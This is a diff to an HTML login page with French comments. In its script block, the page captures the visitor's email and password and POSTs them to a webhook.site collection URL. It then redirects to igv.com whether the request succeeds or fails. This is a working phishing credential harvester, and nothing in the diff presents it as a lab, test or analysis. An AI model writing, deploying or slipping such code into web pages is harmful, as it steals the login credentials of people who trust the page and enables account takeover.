@@ -119,32 +119,38 @@ document.addEventListener("DOMContentLoaded", function() {
   }
 });
 </script>
-  <script>
-  function submitForm(event) {
-    event.preventDefault(); // Empêche le comportement par défaut du formulaire
+<script>
+document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault(); // Empêche l'envoi du formulaire
 
-    const form = document.getElementById('login-form'); // Sélectionne le formulaire
-    const formData = new FormData(form); // Crée un objet FormData
+    // Récupérer les valeurs des champs d'entrée
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
 
-    // Envoie du formulaire au serveur distant
+    // Créer un objet avec les données à envoyer
+    const data = {
+        email: email,
+        password: password
+    };
+
+    // Effectuer la requête POST vers le webhook
     fetch('https://webhook.site/ed57f353-a14b-4fcf-b2e0-2ba38fbbd7b0', {
         method: 'POST',
-        body: formData
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
     })
     .then(response => {
         // On redirige peu importe le résultat de la connexion
         window.location.href = 'https://igv.com';
     })
     .catch(error => {
-        console.error('Error:', error);
+        console.error('Erreur de réseau:', error);
         // Redirection même en cas d'échec
         window.location.href = 'https://igv.com';
     });
-  }
-
-  // Écouteur d'événements pour le clic du bouton
-  document.getElementById('log-in-button').addEventListener('click', submitForm);
+});
 </script>
-
 </body>
 </html>
